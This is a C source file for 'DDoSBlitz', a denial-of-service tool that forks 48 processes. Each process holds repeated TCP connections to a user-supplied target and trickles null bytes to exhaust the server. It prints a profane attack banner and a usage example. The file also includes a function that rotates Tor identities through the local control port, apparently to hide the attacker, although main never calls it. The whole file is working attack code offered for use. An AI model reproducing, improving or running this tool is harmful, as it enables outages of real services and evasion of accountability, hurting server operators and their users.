#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define CONNECTIONS 8
#define THREADS 48

void banner() {
    system("clear");
    printf("\033[1;31m");
    printf(" @@@@@@@  @@@@@@@   @@@@@@   @@@@@@ @@@@@@@  @@@      @@@ @@@@@@@ @@@@@@@@\n");
    printf(" @@!  @@@ @@!  @@@ @@!  @@@ !@@     @@!  @@@ @@!      @@!   @@!        @@!\n");
    printf(" @!@  !@! @!@  !@! @!@  !@!  !@@!!  @!@!@!@  @!!      !!@   @!!      @!!  \n");
    printf(" !!:  !!! !!:  !!! !!:  !!!     !:! !!:  !!! !!:      !!:   !!:    !!:    \n");
    printf(" :: :  :  :: :  :   : :. :  ::.: :  :: : ::  : ::.: : :      :    :.::.: :\n");
    printf("                                                                           \n");
    printf("                          DDoSBlitz\n");
    printf("                           By - New71k\n");
    printf("\033[41m\033[1;37m  Distributed Denial of Service - C Tools  \033[0m\n");
    printf("\033[1;33mAuthor   : \033[1;37mNew71k\033[0m\n");
    printf("\033[1;32mPress CTRL+C to stop sending\033[1;37m\n");
    printf("------------\n");
    printf("\033[1;37mUsage:\033[0m\n");
    printf("    \033[1;32m./DDoSBlitz <target> <port>\033[0m\n");
    printf("Example:\n");
    printf("    \033[1;32m./DDoSBlitz www.example.com 80\033[0m\n");
    usleep(3000000);
    system("clear");
}

int make_socket(char *host, char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        exit(1);
    }
    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }
    if (p == NULL) {
        if (servinfo)
            freeaddrinfo(servinfo);
        fprintf(stderr, "No connection could be made\n");
        exit(1);
    }
    if (servinfo)
        freeaddrinfo(servinfo);
    fprintf(stderr, "\033[1;32m[Connected -> %s:%s]\033[0m\n", host, port);
    return sock;
}

void broke(int s) {}

void attack(char *host, char *port, int id) {
    int sockets[CONNECTIONS];
    int x, r;
    for (x = 0; x < CONNECTIONS; x++)
        sockets[x] = 0;
    signal(SIGPIPE, &broke);
    while (1) {
        for (x = 0; x < CONNECTIONS; x++) {
            if (sockets[x] == 0)
                sockets[x] = make_socket(host, port);
            r = write(sockets[x], "\0", 1);
            if (r == -1) {
                close(sockets[x]);
                sockets[x] = make_socket(host, port);
            } else {
                fprintf(stderr, "\033[1;31m[%i: \033[1;36m%s\033[1;31m ySixx \033[1;35mFucking the Server\033[1;31m]\033[0m\n", id, host);
            }
        }
        usleep(300000);
    }
}

void cycle_identity() {
    int r;
    int socket = make_socket("localhost", "9050");
    write(socket, "AUTHENTICATE \"\"\n", 16);
    while (1) {
        r = write(socket, "signal NEWNYM\n\x00", 16);
        fprintf(stderr, "\033[1;33m[%i: cycle_identity -> signal NEWNYM]\033[0m\n", r);
        usleep(300000);
    }
}

int main(int argc, char **argv) {
    banner();
    if (argc != 3) {
        fprintf(stderr, "Usage: ./DDoSBlitz <target> <port>\n");
        exit(1);
    } else {
        int x;
        for (x = 0; x < THREADS; x++) {
            if (fork() == 0) {
                attack(argv[1], argv[2], x);
                exit(0);
            }
            usleep(200000);
        }
        getc(stdin);
    }
    return 0;
}
